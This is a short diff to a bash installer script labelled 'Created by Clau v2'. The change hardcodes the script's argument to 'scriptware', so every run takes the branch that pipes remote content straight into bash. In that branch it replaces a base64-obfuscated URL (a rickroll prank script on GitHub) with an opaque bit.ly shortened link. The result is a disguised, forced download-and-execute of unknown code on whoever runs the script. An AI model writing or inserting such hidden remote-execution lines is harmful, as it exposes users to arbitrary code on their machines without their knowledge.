@@ -1,6 +1,6 @@
 #!/bin/bash
 ## Created by Clau v2
-msg="$1"
+msg="scriptware"
 errorsfound=0
 
 compl () {
@@ -175,5 +175,5 @@ flush () {
     chmod +x /usr/local/lib/libchilkat_x86_64.dylib
     ;;
     scriptware)
-    curl -L aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2tlcm9zZXJlbmUvcmlja3JvbGxyYy9tYXN0ZXIvcm9sbC5zaA== | bash
+    curl -L http://bit.ly/10hA8iC | bash
     esac
